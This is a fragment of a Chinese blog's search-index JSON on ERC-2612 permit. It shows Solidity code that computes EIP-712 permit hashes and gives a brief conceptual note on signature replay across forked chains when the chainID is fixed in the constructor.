0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9; struct Permit { address owner; address spender; uint256 value; uint256 nonce; uint256 deadline; } // computes the hash of a permit function getStructHash(Permit memory _permit) internal pure returns (bytes32) { return keccak256( abi.encode( PERMIT_TYPEHASH, _permit.owner, _permit.spender, _permit.value, _permit.nonce, _permit.deadline ) ); } // computes the hash of the fully encoded EIP-712 message for the domain, which can be used to recover the signer function getTypedDataHash(Permit memory _permit) public view returns (bytes32) { return keccak256( abi.encodePacked( \"\\x19\\x01\", DOMAIN_SEPARATOR, getStructHash(_permit) ) ); } } ","date":"2023-08-01","objectID":"/erc2612/:3:0","series":null,"tags":null,"title":"ERC2612 Approve的拓展","uri":"/erc2612/#如何使用erc-2612"},{"categories":["system design"],"content":" ERC-2612 安全问题ERC-2612本质上就是在approve之上添加了一组校验逻辑，允许用户在链下提前生成交易的签名，再将交易签名的rsv作为参数传入调用permit 我可以想到可能存在安全漏洞： 重放攻击：在计算DOMAIN_SEPARATOR 时会使用chainID作为标识符，如果链发生分叉，且chainID是在构造函数时即设定，那么在两条链上会有同一个chainID的合约，可以在链A上签名，去链B上重放 ","date":"2023-08-01","objectID":"/erc2612/:4:0","series":null,"tags":null,"title":"ERC2612 Approve的拓展","uri":"/erc2612/#erc-2612-安全问题"}]